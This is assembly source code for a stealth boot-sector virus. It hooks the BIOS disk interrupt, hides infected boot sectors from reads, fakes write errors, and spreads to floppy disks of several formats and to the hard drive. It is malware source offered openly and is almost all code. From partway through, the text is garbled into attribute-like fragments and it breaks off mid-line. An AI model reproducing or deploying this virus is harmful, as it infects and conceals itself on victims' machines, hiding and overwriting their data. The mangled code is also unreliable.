

;Basic Boot Sector Substitutor

COMSEG  SEGMENT PARA
        ASSUME  CS:COMSEG,DS:COMSEG,ES:COMSEG,SS:COMSEG

        ORG     100H

START:
        jmp     BOOT_START

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                             ;size of memory installed, in KB

;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************

        ORG     5E00H

STEALTH:                                        ;A label for the beginning of the virus


;*******************************************************************************
;Format data consists of Track #, Head #, Sector # and Sector size code (2=512b)
;for every sector on the trcak.
FMT_12M:        ;Format data for Track 80, Head 1 on a 1.2 Meg High Density diskette, interleave 2
        DB      80,1,1,2,  80,1,9,2,  80,1,2,2,  80,1,10,2, 80,1,3,2
        DB      80,1,11,2, 80,1,4,2,  80,1,12,2, 80,1,5,2,  80,1,13,2
        DB      80,1,6,2, 80,1,14,2, 80,1,7,2, 80,1,15,2, 80,1,8,2

FMT_360_0:      ;Format data for Track 40, Head 0 on a 360K diskette, interleave 2
        DB      40,0,1,2,  40,0,6,2,  40,0,2,2,  40,0,7,2,  40,0,3,2
        DB      40,0,8,2,  40,0,4,2,  40,0,9,2,  40,0,5,2

FMT_360_1:      ;Format data for Track  40, Head 1 on a 360K diskette, interleave 2
        DB      40,1,1,2,  40,1,6,2,  40,1,2,2,  40,1,7,2,  40,1,3,2
        DB      40,1,8,2,  40,1,4,2,  40,1,9,2,  40,1,5,2


;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                               ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                            ;we want to intercept reads
        jz      READ_FUNCTION
        cmp     ah,3                            ;and writes to all disks
        jz      WRITE_FUNCTION
I13R:   jmp     DWORD PTR cs:[OLD_13H]


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2.
;It checks for several key situations where it must jump into action. They
;are:
;       1) If an attempt is made to read the boot sector, it must be processed
;          through READ_BOOT, so an infected boot sector is never seen.
;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-16 on
;          drive C are read, they are processed by READ_HARD.
;       3) If an attempt is made to read Track 4, Head 0, Sector 1 on the
;          floppy, this routine checks to see if the floppy has already been
;          infected, and if not, it goes ahead and infects it.

READ_FUNCTION:                                  ;Disk Read Function Handler
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
	cmp	ch,1				;is it track 1?
	jz	RF0				;yes, go do special processing
        cmp     ch,0                            ;is it track 0?
	jnz	I13R				;no, let BIOS handle it
        cmp     cl,1                            ;yes, is it sector 1
        jz      READ_BOOT                       ;yes, go handle boot sector read
        cmp     dl,80H                          ;is it a hard drive?
        jnc     RF1                             ;go check further
	jmp	I13R

RF0:	cmp	dl,80H				;is it hard disk?
	jnc	I13R				;yes, let BIOS handle read
        cmp     cl,1                            ;no, floppy, is it sector 1?
        jnz     I13R                            ;no, let BIOS handle it
        call    CHECK_DISK                      ;is floppy already infected?
        jz      I13R                            ;yes so let BIOS handle it
        call    INFECT_FLOPPY                   ;no, go infect it
        jmp     SHORT I13R                      ;and then let BIOS do the read

RF1:    cmp     dl,80H                          ;is it hard drive c: ?
        jnz     I13R                            ;no, another hard drive
        cmp     cl,17                           ;sector < 17?="" jnc="" i13r="" ;nope,="" let="" bios="" handle="" it="" jmp="" read_hard="" ;divert="" read="" on="" the="" c="" drive="" ;*******************************************************************************="" ;this="" section="" of="" code="" handles="" all="" attempts="" to="" access="" the="" disk="" bios="" function="" 3.="" ;it="" checks="" for="" two="" key="" situations="" where="" it="" must="" jump="" into="" action.="" they="" are:="" ;="" ;="" 1)="" if="" an="" attempt="" is="" made="" to="" write="" the="" boot="" sector,="" it="" must="" be="" processed="" ;="" through="" write_boot,="" so="" an="" infected="" boot="" sector="" is="" never="" overwritten.="" ;="" 2)="" if="" any="" of="" the="" infected="" sectors,="" track="" 0,="" head="" 0,="" sector="" 2-16="" on="" ;="" drive="" c="" are="" written,="" they="" are="" processed="" by="" write_hard.="" write_function:="" ;bios="" disk="" write="" function="" cmp="" dh,0="" ;is="" it="" head="" 0?="" jnz="" i13r="" ;nope,="" let="" bios="" handle="" it="" cmp="" ch,0="" ;is="" it="" track="" 0?="" jnz="" i13r="" ;nope,="" let="" bios="" handle="" it="" cmp="" cl,1="" ;is="" it="" sector="" 1="" jnz="" wf1="" ;nope,="" check="" for="" hard="" drive="" jmp="" write_boot="" ;yes,="" go="" handle="" reading="" the="" boot="" sector="" wf1:="" cmp="" dl,80h="" ;is="" it="" the="" hard="" drive="" c:="" jnz="" i13r="" ;no,="" another="" hard="" drive="" cmp="" cl,17="" ;sector="">< 17?="" jnc="" i13r="" ;nope,="" let="" bios="" handle="" it="" jmp="" write_hard="" ;else="" take="" care="" of="" writing="" to="" drive="" c="" ;*******************************************************************************="" ;this="" section="" of="" code="" handles="" reading="" the="" boot="" sector.="" there="" are="" three="" ;possibilities:="" 1)="" the="" disk="" is="" not="" infected,="" in="" which="" case="" the="" read="" should="" be="" ;passed="" directly="" to="" bios,="" 2)="" the="" disk="" is="" infected="" and="" only="" one="" sector="" is="" ;requested,="" in="" which="" case="" this="" routine="" figures="" out="" where="" the="" original="" boot="" ;sector="" is="" and="" reads="" it,="" and="" 3)="" the="" disk="" is="" infected="" and="" more="" than="" one="" sector="" ;is="" requested,="" in="" which="" case="" this="" routine="" breaks="" the="" read="" up="" into="" two="" calls="" to="" the="" ;rom="" bios,="" one="" to="" fetch="" the="" original="" boot="" sector,="" and="" another="" to="" fetch="" the="" ;additional="" sectors="" being="" read.="" one="" of="" the="" complexities="" in="" this="" last="" case="" is="" ;that="" the="" routine="" must="" return="" the="" registers="" set="" up="" as="" if="" only="" one="" read="" had="" ;been="" performed.="" ;="" to="" determine="" if="" the="" disk="" is="" infected,="" the="" routine="" reads="" the="" real="" boot="" sector="" ;into="" scratchbuf="" and="" calls="" is_vbs.="" if="" that="" returns="" affirmative="" (z="" set),="" then="" this="" ;routine="" goes="" to="" get="" the="" original="" boot="" sector,="" etc.,="" otherwise="" it="" calls="" rom="" ;bios="" and="" allows="" a="" second="" read="" to="" take="" place="" to="" get="" the="" boot="" sector="" into="" the="" ;requested="" buffer="" at="" es:bx.="" read_boot:="" push="" ax="" ;save="" registers="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" bp="" push="" cs="" ;set="" ds="es=cs" pop="" es="" push="" cs="" pop="" ds="" mov="" bp,sp="" ;and="" bp="sp" rb001:="" mov="" al,dl="" call="" get_boot_sec="" ;read="" the="" real="" boot="" sector="" call="" get_boot_sec="" ;read="" the="" real="" boot="" sector="" sti="" jnc="" rb01="" jmp="" rb_goon="" ;error="" on="" read="" here,="" let="" rom="" bios="" return="" proper="" error="" code="" rb01:="" call="" is_vbs="" ;good="" read,="" is="" it="" the="" viral="" boot="" sector?="" jz="" rb02="" ;yes="" jmp="" rb_goon="" ;no,="" just="" go="" let="" rom="" bios="" read="" sector="" rb02:="" mov="" bx,offset="" scratchbuf="" +="" (offset="" dr_flag="" -="" offset="" boot_start)="" mov="" al,byte="" ptr="" [bx]="" cmp="" al,80h="" ;infected,="" so="" we="" must="" redirect="" the="" read="" jnz="" rb1="" mov="" al,4="" ;make="" an="" index="" of="" the="" drive="" type="" being="" read="" rb1:="" mov="" bl,3="" mul="" bl="" ;ax="offset" to="" boot_sector_location="" table="" add="" ax,offset="" boot_sector_location="" mov="" bx,ax="" mov="" ch,[bx]="" mov="" dh,[bx+1]="" mov="" cl,[bx+2]="" ;set="" up="" everything="" for="" the="" read="" mov="" dl,ss:[bp+6]="" mov="" bx,ss:[bp+10]="" mov="" ax,ss:[bp+2]="" mov="" es,ax="" mov="" ax,201h="" mov="" al,ss:[bp+12]="" pushf="" call="" dword="" ptr="" [old_13h]="" sti="" mov="" al,ss:[bp+12]="" ;see="" if="" it="" was="" a="" more="" than="" 1="" sector="" read="" cmp="" al,1="" jz="" rb_exit="" read_1next:="" ;more="" than="" 1="" sector,="" read="" the="" rest="" now="" pop="" bp="" ;as="" a="" second="" call="" to="" bios="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" add="" bx,512="" ;prepare="" to="" call="" old="" handler="" for="" balance="" of="" read="" push="" ax="" dec="" al="" inc="" cl="" cmp="" dl,80h="" ;is="" it="" the="" hard="" drive="" jnz="" rb15="" ;nope,="" go="" handle="" floppy="" push="" bx="" ;handle="" an="" infected="" hard="" drive="" push="" cx="" ;by="" faking="" the="" read="" on="" extra="" sectors="" push="" dx="" ;and="" returning="" a="" block="" of="" f6's="" push="" si="" push="" di="" push="" ds="" push="" bp="" push="" es="" pop="" ds="" ;ds="es" mov="" byte="" ptr="" [bx],0="" ;set="" first="" byte="" in="" buffer="" mov="" si,bx="" mov="" di,bx="" inc="" di="" mov="" ah,0="" ;ax="number" of="" sectors="" to="" read="" now="" mov="" bx,512="" ;bytes="" per="" sector="" mul="" bx="" ;number="" of="" bytes="" to="" read="" in="" dx:ax,="" better="" be="">< 64k="" mov="" cx,ax="" dec="" cx="" ;number="" of="" bytes="" to="" move="" rep="" movsb="" ;fill="" buffer="" with="" f6's="" clc="" ;clear="" carry="" pushf="" ;then="" restore="" everyting="" properly="" pop="" ax="" mov="" ss:[bp+20],ax="" pop="" bp="" pop="" ds="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" dec="" cl="" sub="" bx,512="" iret="" ;and="" get="" out="" rb15:="" ;read="" next="" sectors="" on="" floppy="" drive="" pushf="" call="" dword="" ptr="" cs:[old_13h]="" ;read="" the="" rest="" (must="" use="" cs="" now!)="" sti="" push="" ax="" push="" bp="" mov="" bp,sp="" pushf="" pop="" ax="" mov="" ss:[bp+10],ax="" jc="" rb2="" ;an="" error,="" so="" exit="" with="" ah="" from="" 2nd="" int="" 13="" rb17:="" sub="" bx,512="" dec="" cl="" pop="" bp="" pop="" ax="" pop="" ax="" ;else="" exit="" with="" ah="" from="" first="" int="" 13="" mov="" ah,0="" iret="" rb2:="" pop="" bp="" pop="" ax="" add="" sp,2="" iret="" rb_exit:="" mov="" ax,ss:[bp+18]="" push="" ax="" popf="" clc="" pushf="" pop="" ax="" mov="" ss:[bp+18],ax="" pop="" bp="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" iret="" rb_goon:="" ;this="" just="" restores="" all="" registers="" as="" they="" were="" pop="" bp="" ;when="" int_13h="" was="" reached,="" and="" passes="" control="" pop="" es="" ;to="" the="" rom="" bios="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" jmp="" i13r="" ;*******************************************************************************="" ;this="" routine="" handles="" writing="" the="" boot="" sector="" for="" all="" disks.="" it="" checks="" to="" see="" ;if="" the="" disk="" has="" been="" infected,="" and="" if="" not,="" allows="" bios="" to="" handle="" the="" write.="" ;if="" the="" disk="" is="" infected,="" this="" routine="" redirects="" the="" write="" to="" put="" the="" boot="" ;sector="" being="" written="" in="" the="" reserved="" area="" for="" the="" original="" boot="" sector.="" it="" ;must="" also="" handle="" the="" writing="" of="" multiple="" sectors="" properly.="" write_boot:="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" bp="" mov="" bp,sp="" push="" cs="" ;ds="es=cs" pop="" ds="" push="" cs="" pop="" es="" mov="" al,dl="" call="" get_boot_sec="" call="" get_boot_sec="" ;read="" the="" real="" boot="" sector="" sti="" jnc="" wb01="" jmp="" wb_goon="" ;error="" on="" read="" here,="" go="" handle="" it="" wb01:="" call="" is_vbs="" ;good="" read,="" is="" it="" the="" viral="" boot="" sector?="" jz="" wb02="" ;yes="" jmp="" wb_goon="" ;no,="" just="" go="" let="" rom="" bios="" write="" sector="" wb02:="" mov="" bx,offset="" scratchbuf="" +="" (offset="" dr_flag="" -="" offset="" boot_start)="" mov="" al,byte="" ptr="" [bx]="" cmp="" al,80h="" ;infected,="" so="" we="" must="" redirect="" the="" write="" jnz="" wb1="" mov="" al,4="" ;make="" an="" index="" of="" the="" drive="" type="" being="" write="" wb1:="" mov="" bl,3="" mul="" bl="" ;ax="offset" to="" boot_sector_location="" table="" add="" ax,offset="" boot_sector_location="" mov="" bx,ax="" mov="" ch,[bx]="" mov="" dh,[bx+1]="" mov="" cl,[bx+2]="" ;set="" up="" everything="" for="" the="" write="" mov="" dl,ss:[bp+6]="" mov="" bx,ss:[bp+10]="" mov="" ax,ss:[bp+2]="" mov="" es,ax="" mov="" ax,301h="" mov="" al,ss:[bp+12]="" pushf="" call="" dword="" ptr="" [old_13h]="" sti="" mov="" dl,ss:[bp+6]="" cmp="" dl,80h="" ;was="" boot="" sector="" going="" to="" hard="" drive?="" jnz="" wb_15="" ;no="" mov="" [dr_flag],80h="" ;yes,="" update="" partition="" info="" push="" si="" push="" di="" mov="" di,offset="" part="" mov="" si,ss:[bp+10]="" add="" si,offset="" part="" -="" offset="" boot_start="" push="" es="" pop="" ds="" push="" cs="" pop="" es="" ;switch="" ds="" and="" es="" around="" mov="" cx,20="" rep="" movsw="" ;and="" move="" partition="" data="" to="" viral="" boot="" record="" push="" cs="" pop="" ds="" mov="" ax,301h="" mov="" bx,offset="" boot_start="" mov="" cx,1="" ;track="" 0,="" sector="" 1="" mov="" dx,80h="" ;drive="" 80h,="" head="" 0="" pushf="" call="" dword="" ptr="" [old_13h]="" ;go="" write="" updated="" boot="" sector="" pop="" di="" pop="" si="" wb_15:="" mov="" al,ss:[bp+12]="" cmp="" al,1="" jz="" wb_exit="" ;see="" if="" it="" was="" a="" more="" than="" 1="" sector="" write="" write_1next:="" ;more="" than="" 1="" sector="" mov="" dl,ss:[bp+6]="" ;see="" if="" it's="" the="" hard="" drive="" cmp="" dl,80h="" jz="" wb_exit="" ;if="" so,="" ignore="" write="" to="" other="" sectors="" pop="" bp="" ;floppy="" drive,="" write="" the="" rest="" now="" pop="" es="" ;as="" a="" second="" call="" to="" bios="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" add="" bx,512="" ;prepare="" to="" call="" old="" handler="" for="" balance="" of="" read="" push="" ax="" dec="" al="" inc="" cl="" pushf="" call="" dword="" ptr="" cs:[old_13h]="" ;read="" the="" rest="" (must="" use="" cs="" now!)="" sti="" push="" ax="" push="" bp="" mov="" bp,sp="" pushf="" pop="" ax="" mov="" ss:[bp+10],ax="" jc="" wb2="" ;an="" error,="" so="" exit="" with="" ah="" from="" 2nd="" int="" 13="" sub="" bx,512="" dec="" cl="" pop="" bp="" pop="" ax="" pop="" ax="" ;else="" exit="" with="" ah="0" mov="" ah,0="" iret="" wb2:="" pop="" bp="" pop="" ax="" add="" sp,2="" iret="" wb_exit:="" mov="" ax,ss:[bp+18]="" ;set="" carry="" on="" stack="" to="" indicate="" push="" ax="" ;a="" successful="" write="" operation="" popf="" clc="" pushf="" pop="" ax="" mov="" ss:[bp+18],ax="" pop="" bp="" ;restore="" all="" registers="" and="" exit="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" iret="" wb_goon:="" ;this="" just="" restores="" all="" registers="" as="" they="" were="" pop="" bp="" ;when="" int_13h="" was="" reached,="" and="" passes="" control="" pop="" es="" ;to="" the="" rom="" bios="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" jmp="" i13r="" ;*******************************************************************************="" ;read="" hard="" disk="" sectors="" on="" track="" 0,="" head="" 0.="" if="" the="" hard="" disk="" is="" infected,="" ;then="" instead="" of="" reading="" the="" true="" data="" there,="" return="" a="" block="" of="" 0's,="" since="" ;0="" is="" the="" data="" stored="" in="" a="" freshly="" formatted="" but="" unused="" sector.="" this="" will="" ;fake="" the="" caller="" out="" and="" keep="" him="" from="" knowing="" that="" the="" virus="" is="" hiding="" there.="" ;if="" the="" disk="" is="" not="" infected,="" return="" the="" true="" data="" stored="" in="" those="" sectors.="" read_hard:="" call="" check_disk="" ;see="" if="" disk="" is="" infected="" jnz="" rh_ex="" ;no,="" let="" bios="" handle="" the="" read="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" si="" push="" di="" push="" ds="" push="" bp="" mov="" bp,sp="" mov="" byte="" ptr="" es:[bx],0="" push="" es="" pop="" ds="" mov="" si,bx="" mov="" di,bx="" inc="" di="" mov="" ah,0="" ;ax="number" of="" sectors="" to="" read="" now="" mov="" bx,512="" ;bytes="" per="" sector="" mul="" bx="" ;number="" of="" bytes="" to="" read="" in="" dx:ax,="" better="" be="">< 64k="" mov="" cx,ax="" dec="" cx="" ;number="" of="" bytes="" to="" move="" rep="" movsb="" ;to="" give="" a="" fake="" read="" of="" all="" f6's="" mov="" ax,ss:[bp+20]="" ;now="" set="" c="" flag="" to="" successful="" push="" ax="" popf="" clc="" pushf="" pop="" ax="" mov="" ss:[bp+20],ax="" pop="" bp="" ;restore="" everything="" and="" exit="" pop="" ds="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" mov="" ah,0="" iret="" rh_ex:="" jmp="" i13r="" ;*******************************************************************************="" ;handle="" writes="" to="" hard="" disk="" sectors="" 2="" -="" 16="" on="" track="" 0,="" head="" 0.="" we="" must="" modify="" ;the="" read="" if="" the="" disk="" is="" infected.="" this="" is="" very="" simple:="" just="" don't="" allow="" the="" ;writes="" to="" take="" place.="" instead,="" fake="" the="" return="" of="" an="" error="" by="" setting="" carry="" ;and="" returning="" ah="4" (sector="" not="" found).="" write_hard:="" call="" check_disk="" ;see="" if="" the="" disk="" is="" infected="" jnz="" wh_ex="" ;no,="" let="" bios="" handle="" it="" all="" push="" bp="" push="" ax="" mov="" bp,sp="" mov="" ax,ss:[bp+8]="" ;get="" flags="" off="" of="" stack="" push="" ax="" popf="" ;put="" them="" in="" current="" flags="" stc="" ;set="" the="" carry="" flag="" pushf="" pop="" ax="" mov="" ss:[bp+8],ax="" ;and="" put="" flags="" back="" on="" stack="" pop="" ax="" mov="" ah,4="" ;set="" up="" sector="" not="" found="" error="" pop="" bp="" iret="" ;and="" get="" out="" of="" isr="" wh_ex:="" jmp="" i13r="" ;this="" table="" identifies="" where="" the="" original="" boot="" sector="" is="" located="" for="" each="" ;of="" the="" various="" disk="" types.="" boot_sector_location:="" db="" 40,1,6="" ;track,="" head,="" sector="" for="" orig="" boot="" sector,="" 360k="" drive="" db="" 80,1,15="" ;1.2m="" drive="" db="" 79,1,9="" ;720k="" drive="" db="" 79,1,18="" ;1.44m="" drive="" db="" 0,0,16="" ;hard="" drive="" ;see="" if="" disk="" dl="" is="" infected="" already.="" if="" so,="" return="" with="" z="" set.="" this="" ;does="" not="" assume="" that="" registers="" have="" been="" saved.="" check_disk:="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" cs="" pop="" ds="" push="" cs="" pop="" es="" mov="" al,dl="" call="" get_boot_sec="" jnc="" cd1="" xor="" al,al="" ;fake="" as="" if="" infected="" jmp="" short="" cd2="" ;in="" the="" event="" of="" an="" error="" cd1:="" call="" is_vbs="" ;see="" if="" viral="" boot="" sector="" cd2:="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" ;*******************************************************************************="" ;this="" routine="" determines="" from="" the="" boot="" sector="" parameters="" what="" kind="" of="" floppy="" ;disk="" is="" in="" the="" drive="" being="" accessed,="" and="" calls="" the="" proper="" infection="" routine.="" infect_floppy:="" pushf="" push="" si="" push="" di="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" push="" cs="" pop="" es="" push="" cs="" pop="" ds="" sti="" mov="" bx,offset="" scratchbuf="" +="" 13h="" ;address="" of="" sector="" count="" in="" boot="" sector="" mov="" bx,[bx]="" ;get="" sector="" count="" for="" this="" disk="" mov="" al,dl="" cmp="" bx,720="" ;is="" it="" 360k?="" jnz="" if_1="" call="" infect_360k="" ;yes,="" infect="" it="" jmp="" short="" if_r="" if_1:="" cmp="" bx,2400="" ;is="" it="" 1.2m?="" jnz="" if_2="" call="" infect_12m="" ;yes,="" infect="" it="" jmp="" short="" if_r="" if_2:="" cmp="" bx,1440="" ;is="" it="" 720k="" 3="" 1/2"?="" jnz="" if_3="" call="" infect_720k="" ;yes,="" infect="" it="" jmp="" short="" if_r="" if_3:="" cmp="" bx,2880="" ;is="" it="" 1.44m="" 3="" 1/2"?="" jnz="" if_r="" ;no="" -="" don't="" infect="" this="" disk="" call="" infect_144m="" ;yes="" -="" infect="" it="" if_r:="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" pop="" di="" pop="" si="" popf="" ret="" ;*******************************************************************************="" infect_360k:="" call="" format_360="" ;format="" the="" required="" sectors="" jc="" inf360_exit="" mov="" bx,offset="" scratchbuf="" ;and="" go="" write="" it="" at="" track="" 40,="" head="" 1,="" sector="" 6="" push="" ax="" mov="" dl,al="" mov="" dh,1="" ;head="" 1="" mov="" cx,2806h="" ;track="" 40,="" sector="" 6="" mov="" ax,0301h="" ;bios="" write,="" for="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" jc="" inf360_exit="" mov="" di,offset="" boot_data="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" cx,1bh="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" al,byte="" ptr="" [scratchbuf="" +="" 1fdh]="" ;copy="" drive="" letter="" there="" as="" well="" mov="" byte="" ptr="" [boot_start="" +="" 1fdh],al="" mov="" [dr_flag],0="" ;set="" proper="" drive="" type="" push="" ax="" ;and="" write="" new="" boot="" sector="" to="" disk="" mov="" bx,offset="" boot_start="" ;this="" is="" buffer="" for="" the="" new="" boot="" sector="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" pop="" ax="" jc="" inf360_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 9="" sectors="" of="" stealth="" routines="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,0="" ;head="" 0="" mov="" cx,2801h="" ;track="" 40,="" sector="" 1="" mov="" ax,0309h="" ;write="" 9="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" jc="" inf360_exit="" add="" bx,9*512="" ;do="" remaining="" 5="" sectors="" now="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,2801h="" ;track="" 40,="" sector="" 1="" mov="" ax,0305h="" ;write="" 5="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf360_exit:="" ret="" ;all="" done="" ;format="" track="" 40,="" head="" 0="" and="" 1="" so="" we="" can="" infect="" a="" 360k="" diskette.="" format_360:="" push="" ax="" mov="" dl,al="" mov="" dh,0="" ;head="" 0="" mov="" cx,2801h="" ;track="" 40,="" start="" at="" sector="" 1="" mov="" ax,0509h="" ;format="" 9="" sectors="" mov="" bx,offset="" fmt_360_0="" ;format="" info="" for="" this="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" push="" ax="" mov="" dl,al="" mov="" dh,1="" ;head="" 1="" mov="" cx,2801h="" ;track="" 40,="" start="" at="" sector="" 1="" mov="" ax,0509h="" ;format="" 9="" sectors="" mov="" bx,offset="" fmt_360_1="" ;format="" info="" for="" this="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" ret="" ;*******************************************************************************="" ;infect="" floppy="" disk="" drive="" al="" with="" this="" virus.="" this="" involves="" the="" following="" steps:="" ;a)="" read="" the="" present="" boot="" sector.="" b)="" copy="" it="" to="" track="" 80,="" head="" 1,="" sector="" 15.="" ;c)="" copy="" the="" disk="" parameter="" info="" into="" the="" new="" boot="" sector="" in="" memory.="" d)="" copy="" the="" ;new="" boot="" sector="" to="" track="" 0,="" head="" 0,="" sector="" 1.="" e)="" copy="" the="" stealth="" routines="" to="" ;track="" 79,="" head="" 1,="" sector="" 1,="" 14="" sectors="" total.="" infect_12m:="" call="" adjust_dbt="" ;set="" up="" disk="" base="" table="" for="" 15="" sec="" format="" call="" format_12m="" jc="" inf12m_exit="" mov="" bx,offset="" scratchbuf="" ;and="" go="" write="" it="" at="" track="" 80,="" head="" 1,="" sector="" 15="" push="" ax="" mov="" dl,al="" mov="" dh,1="" ;head="" 1="" mov="" cx,500fh="" ;track="" 80,="" sector="" 15="" mov="" ax,0301h="" ;bios="" write,="" for="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" jc="" inf12m_exit="" mov="" di,offset="" boot_data="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" cx,1bh="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" al,byte="" ptr="" [scratchbuf="" +="" 1fdh]="" ;copy="" drive="" letter="" there="" as="" well="" mov="" byte="" ptr="" [boot_start="" +="" 1fdh],al="" mov="" [dr_flag],1="" ;set="" proper="" diskette="" type="" push="" ax="" ;and="" write="" new="" boot="" sector="" to="" disk="" mov="" bx,offset="" boot_start="" ;this="" is="" buffer="" for="" the="" new="" boot="" sector="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" pop="" ax="" jc="" inf12m_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 14="" sectors="" of="" stealth="" routines="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,5001h="" ;track="" 80,="" sector="" 1="" mov="" ax,030eh="" ;write="" 14="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf12m_exit:="" call="" reset_dbt="" ;reset="" the="" disk="" base="" table="" to="" original="" ret="" ;all="" done="" ;format="" track="" 80,="" head="" 1="" so="" we="" can="" infect="" a="" 1.2="" meg="" diskette.="" format_12m:="" push="" ax="" mov="" dl,al="" mov="" dh,1="" ;head="" 1="" mov="" cx,5001h="" ;track="" 80,="" start="" at="" sector="" 1="" mov="" ax,050fh="" ;format="" 15="" sectors="" mov="" bx,offset="" fmt_12m="" ;format="" info="" for="" this="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" ret="" ;*******************************************************************************="" infect_720k:="" mov="" bx,offset="" scratchbuf="" ;go="" write="" boot="" sec="" at="" track="" 79,="" head="" 1,="" sector="" 9="" push="" ax="" mov="" dl,al="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f09h="" ;track="" 79,="" sector="" 9="" mov="" ax,0301h="" ;bios="" write,="" for="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" jc="" inf720k_exit="" mov="" di,offset="" boot_data="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" cx,1bh="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" al,byte="" ptr="" [scratchbuf="" +="" 1fdh]="" ;copy="" drive="" letter="" there="" as="" well="" mov="" byte="" ptr="" [boot_start="" +="" 1fdh],al="" mov="" [dr_flag],2="" ;set="" proper="" diskette="" type="" push="" ax="" ;and="" write="" new="" boot="" sector="" to="" disk="" mov="" bx,offset="" boot_start="" ;this="" is="" buffer="" for="" the="" new="" boot="" sector="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" pop="" ax="" jc="" inf720k_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 14="" sectors="" of="" stealth="" routines="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,0="" ;head="" 0="" mov="" cx,4f04h="" ;track="" 79,="" sector="" 4="" mov="" ax,0306h="" ;write="" 6="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" jc="" inf720k_exit="" mov="" bx,offset="" stealth="" +="" 6*512="" ;buffer="" for="" 8="" more="" sectors="" of="" stealth="" routines="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f01h="" ;track="" 79,="" sector="" 1="" mov="" ax,0308h="" ;write="" 8="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf720k_exit:="" ret="" ;all="" done="" ;*******************************************************************************="" infect_144m:="" mov="" bx,offset="" scratchbuf="" ;go="" write="" boot="" sec="" at="" track="" 79,="" head="" 1,="" sector="" 18="" push="" ax="" mov="" dl,al="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f12h="" ;track="" 79,="" sector="" 18="" mov="" ax,0301h="" ;bios="" write,="" for="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" jc="" inf144m_exit="" mov="" di,offset="" boot_data="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" cx,1bh="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" al,byte="" ptr="" [scratchbuf="" +="" 1fdh]="" ;copy="" drive="" letter="" there="" as="" well="" mov="" byte="" ptr="" [boot_start="" +="" 1fdh],al="" mov="" [dr_flag],3="" ;set="" proper="" diskette="" type="" push="" ax="" ;and="" write="" new="" boot="" sector="" to="" disk="" mov="" bx,offset="" boot_start="" ;this="" is="" buffer="" 